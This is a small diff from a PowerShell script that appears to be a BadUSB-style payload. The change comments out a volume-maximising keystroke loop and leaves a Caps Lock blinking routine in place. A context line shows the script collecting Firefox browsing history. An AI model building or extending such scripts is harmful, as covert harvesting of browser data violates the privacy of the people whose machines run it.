@@ -317,7 +317,8 @@ $F_his = Get-BrowserData -Browser "firefox" -DataType "history" -ErrorAction Sil
 
 # caps lock indicator light
 $blinks = 3; $o = New-Object -ComObject WScript.Shell; for ($num = 1 ; $num -le $blinks * 2; $num++) { $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Milliseconds 250 }
-$k = [Math]::Ceiling(100 / 2); $o = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt $k; $i++) { $o.SendKeys([char] 175) }
+# vol
+# $k = [Math]::Ceiling(100 / 2); $o = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt $k; $i++) { $o.SendKeys([char] 175) }
 
 
 #-----------------------------------------------------------------------------------------------------------
